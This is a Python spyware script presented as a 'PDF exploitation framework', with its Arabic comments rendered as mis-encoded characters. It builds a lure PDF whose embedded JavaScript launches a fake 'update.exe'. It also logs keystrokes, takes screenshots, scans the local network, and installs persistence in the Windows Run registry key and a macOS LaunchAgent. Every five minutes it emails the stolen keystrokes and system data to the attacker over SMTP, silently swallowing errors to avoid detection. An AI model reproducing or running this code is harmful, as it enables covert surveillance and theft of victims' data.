#!/usr/bin/env python3
"""
MOBILE PHISHING PAYLOAD - PDF EXPLOITATION FRAMEWORK
Ø¨Ø±Ù†Ø§Ù…Ø¬ ØªØ¬Ø³Ø³ÙŠ Ù…ØªÙƒØ§Ù…Ù„ Ù…ØªØ®ÙÙŠ ÙÙŠ ØµÙˆØ±Ø© Ù…Ù„Ù PDF
"""

import os
import sys
import socket
import threading
import subprocess
from datetime import datetime
import mimetypes
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class MobilePhisher:
    def __init__(self):
        # ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©
        self.collected_data = []
        
        # Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        self.smtp_config = {
            'server': 'smtp.gmail.com',
            'port': 587,
            'email': 'your_phishing_email@gmail.com',
            'password': 'your_app_password_here'
        }
        
    def create_malicious_pdf(self):
        """
        ğŸ“„ ØµÙ†Ø¹ Ù…Ù„Ù PDF Ø®Ø¨ÙŠØ«
        --------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: ØµÙ†Ø¹ Ù…Ù„Ù PDF ÙŠØ¨Ø¯Ùˆ Ø·Ø¨ÙŠØ¹ÙŠØ§Ù‹ Ù„ÙƒÙ†Ù‡ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ Ø®Ø¨ÙŠØ«
        """
        # Ù…Ø­ØªÙˆÙ‰ PDF Ø¹Ø§Ø¯ÙŠ
        pdf_content = """
        %PDF-1.4
        1 0 obj
        << /Type /Catalog /Pages 2 0 R >>
        endobj
        2 0 obj
        << /Type /Pages /Kids [3 0 R] /Count 1 >>
        endobj
        3 0 obj
        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
        endobj
        4 0 obj
        << /Length 100 >>
        stream
        BT /F1 12 Tf 100 700 Td (Important Document) Tj ET
        """
        
        # ÙƒÙˆØ¯ Ø¬Ø§ÙØ§ Ø³ÙƒØ±ÙŠØ¨Øª Ø®Ø¨ÙŠØ« Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ù‚Ø§Ø±Ø¦Ø§Øª PDF
        js_exploit = """
        /S /JavaScript /JS (
        app.alert("This document requires an update to view properly");
        this.exportDataObject({cName: "update.exe", nLaunch: 2});
        )
        """
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ù„Ù…Ù„Ù PDF
        pdf_content += js_exploit + "\nendstream\nendobj\nxref\ntrailer\n<< /Root 1 0 R /Size 5 >>\nstartxref\n0\n%%EOF"
        
        # Ø­ÙØ¸ Ù…Ù„Ù PDF
        with open("Important_Document.pdf", "w") as f:
            f.write(pdf_content)
        
        return "Important_Document.pdf"
    
    def collect_system_info(self):
        """
        ğŸ” Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        ---------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø´Ø§Ù…Ù„Ø© Ø¹Ù† Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø¶Ø­ÙŠØ©
        """
        system_info = {
            'timestamp': str(datetime.now()),      # Ø§Ù„ÙˆÙ‚Øª ÙˆØ§Ù„ØªØ§Ø±ÙŠØ®
            'platform': sys.platform,              # Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„
            'username': os.getenv('USER') or os.getenv('USERNAME'),  # Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
            'hostname': socket.gethostname(),      # Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²
            'ip_address': socket.gethostbyname(socket.gethostname()),  # Ø¹Ù†ÙˆØ§Ù† IP
            'current_directory': os.getcwd()       # Ø§Ù„Ù…Ø¬Ù„Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠ
        }
        return system_info
    
    def keylogger_module(self):
        """
        âŒ¨ï¸ ØªØ³Ø¬ÙŠÙ„ Ø¶ØºØ·Ø§Øª Ø§Ù„Ù…ÙØ§ØªÙŠØ­
        -----------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: ØªØ³Ø¬ÙŠÙ„ ÙƒÙ„ Ù…Ø§ ÙŠÙƒØªØ¨Ù‡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­
        """
        try:
            from pynput import keyboard
            
            def on_press(key):
                """
                ğŸ“ ØªØ³Ø¬ÙŠÙ„ ÙƒÙ„ Ø¶ØºØ·Ø© Ù…ÙØªØ§Ø­
                """
                try:
                    # ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø£Ø­Ø±Ù Ø§Ù„Ø¹Ø§Ø¯ÙŠØ©
                    with open("keystrokes.log", "a") as log:
                        log.write(f'{key.char}')
                except AttributeError:
                    # ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…ÙØ§ØªÙŠØ­ Ø§Ù„Ø®Ø§ØµØ© (Enter, Shift, etc.)
                    with open("keystrokes.log", "a") as log:
                        log.write(f'[{key}]')
            
            # Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ø¶ØºØ·Ø§Øª Ø§Ù„Ù…ÙØ§ØªÙŠØ­
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
        except ImportError:
            # Ø¥Ø°Ø§ Ù„Ù… ØªÙƒÙ† Ø§Ù„Ù…ÙƒØªØ¨Ø© Ù…Ø«Ø¨ØªØ©
            pass
    
    def screenshot_module(self):
        """
        ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©
        ----------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ± Ù„Ù„Ø´Ø§Ø´Ø© Ø¨Ø´ÙƒÙ„ Ø¯ÙˆØ±ÙŠ
        """
        try:
            import pyautogui
            # Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù„Ù„Ø´Ø§Ø´Ø©
            screenshot = pyautogui.screenshot()
            # Ø­ÙØ¸ Ø§Ù„ØµÙˆØ±Ø© Ù…Ø¹ timestamp
            screenshot.save(f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        except ImportError:
            # Ø¥Ø°Ø§ Ù„Ù… ØªÙƒÙ† Ø§Ù„Ù…ÙƒØªØ¨Ø© Ù…Ø«Ø¨ØªØ©
            pass
    
    def network_scanner(self):
        """
        ğŸŒ Ù…Ø³Ø­ Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ù…Ø­Ù„ÙŠØ©
        ---------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…ØªØµÙ„Ø© Ø¨Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ù…Ø­Ù„ÙŠØ©
        """
        # Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¹Ù†ÙˆØ§Ù† IP Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ
        base_ip = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1])
        
        def ping_host(ip):
            """
            ğŸ¯ ÙØ­Øµ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¬Ù‡Ø§Ø² Ù†Ø´Ø·
            """
            try:
                # Ø¥Ø±Ø³Ø§Ù„ ping Ù„Ù„Ø¬Ù‡Ø§Ø²
                subprocess.check_output(['ping', '-c', '1', '-W', '1', ip], 
                                      stderr=subprocess.DEVNULL)
                return ip
            except:
                return None
        
        threads = []
        active_hosts = []
        
        # ÙØ­Øµ ÙƒÙ„ Ø§Ù„Ø¹Ù†Ø§ÙˆÙŠÙ† ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            thread = threading.Thread(target=lambda: active_hosts.append(ping_host(ip)))
            threads.append(thread)
            thread.start()
        
        # Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù†ØªÙ‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø®ÙŠÙˆØ·
        for thread in threads:
            thread.join()
        
        return [host for host in active_hosts if host]
    
    def data_exfiltration(self, files=None):
        """
        ğŸ“§ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø±ÙˆÙ‚Ø©
        ---------------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø© Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø®ØªØ±Ù‚
        """
        if files is None:
            files = ["keystrokes.log", "system_info.txt"]
        
        # Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
        msg = MIMEMultipart()
        msg['From'] = self.smtp_config['email']
        msg['To'] = self.smtp_config['email']
        msg['Subject'] = f"Collected Data - {datetime.now()}"
        
        # Ù†Øµ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
        body = f"Data collected from target: {socket.gethostname()}\n\n"
        body += f"System Info: {self.collect_system_info()}\n"
        msg.attach(MIMEText(body, 'plain'))
        
        # Ø¥Ø±ÙØ§Ù‚ Ø§Ù„Ù…Ù„ÙØ§Øª
        for file in files:
            if os.path.exists(file):
                attachment = open(file, "rb")
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {file}")
                msg.attach(part)
        
        try:
            # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
            server = smtplib.SMTP(self.smtp_config['server'], self.smtp_config['port'])
            server.starttls()
            server.login(self.smtp_config['email'], self.smtp_config['password'])
            server.send_message(msg)
            server.quit()
        except Exception as e:
            # ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ Ù„ØªØ¬Ù†Ø¨ Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬
            pass
    
    def persistence_mechanism(self):
        """
        ğŸ”„ Ø¢Ù„ÙŠØ© Ø§Ù„Ø¨Ù‚Ø§Ø¡ ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…
        ------------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: Ø¶Ù…Ø§Ù† Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø¹Ù…Ù„ Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø¨Ø¹Ø¯ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ´ØºÙŠÙ„
        """
        if sys.platform == "win32":
            # Ø¢Ù„ÙŠØ© Ø§Ù„Ø¨Ù‚Ø§Ø¡ ÙÙŠ Windows
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
            except:
                pass
        elif sys.platform == "darwin":
            # Ø¢Ù„ÙŠØ© Ø§Ù„Ø¨Ù‚Ø§Ø¡ ÙÙŠ macOS
            plist_content = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.system.update</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{sys.executable}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
            </dict>
            </plist>
            """
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
            with open(plist_path, "w") as f:
                f.write(plist_content)
    
    def execute_payload(self):
        """
        ğŸš€ Ø§Ù„ØªÙ†ÙÙŠØ° Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ù„Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬
        ---------------------------
        Ø§Ù„ÙˆØ¸ÙŠÙØ©: ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ù…ÙƒÙˆÙ†Ø§Øª Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø§Ù„ØªØ¬Ø³Ø³ÙŠ
        """
        # 1. ØµÙ†Ø¹ Ù…Ù„Ù PDF Ù…Ø²ÙŠÙ
        pdf_path = self.create_malicious_pdf()
        
        # 2. Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        system_info = self.collect_system_info()
        with open("system_info.txt", "w") as f:
            f.write(str(system_info))
        
        # 3. ØªØ´ØºÙŠÙ„ Ù…Ø³Ø¬Ù„ Ø§Ù„Ù…ÙØ§ØªÙŠØ­
        self.keylogger_module()
        
        # 4. Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø´Ø§Ø´Ø© Ø£ÙˆÙ„ÙŠØ©
        self.screenshot_module()
        
        # 5. Ø¥Ø¹Ø¯Ø§Ø¯ Ø¢Ù„ÙŠØ© Ø§Ù„Ø¨Ù‚Ø§Ø¡
        self.persistence_mechanism()
        
        # 6. Ù…Ø³Ø­ Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ù…Ø­Ù„ÙŠØ©
        network_hosts = self.network_scanner()
        with open("network_scan.txt", "w") as f:
            f.write("\n".join(network_hosts))
        
        # 7. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©
        self.data_exfiltration()
        
        # 8. Ø¬Ø¯ÙˆÙ„Ø© Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯ÙˆØ±ÙŠ
        def periodic_collection():
            import time
            while True:
                time.sleep(300)  # Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± 5 Ø¯Ù‚Ø§Ø¦Ù‚
                self.screenshot_module()
                self.data_exfiltration()
        
        # ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙˆÙ„Ø© ÙÙŠ Ø®ÙŠØ· Ù…Ù†ÙØµÙ„
        collection_thread = threading.Thread(target=periodic_collection)
        collection_thread.daemon = True
        collection_thread.start()
        
        return pdf_path

if __name__ == "__main__":
    # Ø¥Ù†Ø´Ø§Ø¡ ÙƒØ§Ø¦Ù† Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø§Ù„ØªØ¬Ø³Ø³ÙŠ
    phisher = MobilePhisher()
    
    # ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨Ø±Ù†Ø§Ù…Ø¬
    result_pdf = phisher.execute_payload()
    
    # Ø·Ø¨Ø§Ø¹Ø© Ø§Ø³Ù… Ù…Ù„Ù PDF Ø§Ù„Ù…Ø²ÙŠÙ
    print(f"PDF created: {result_pdf}")
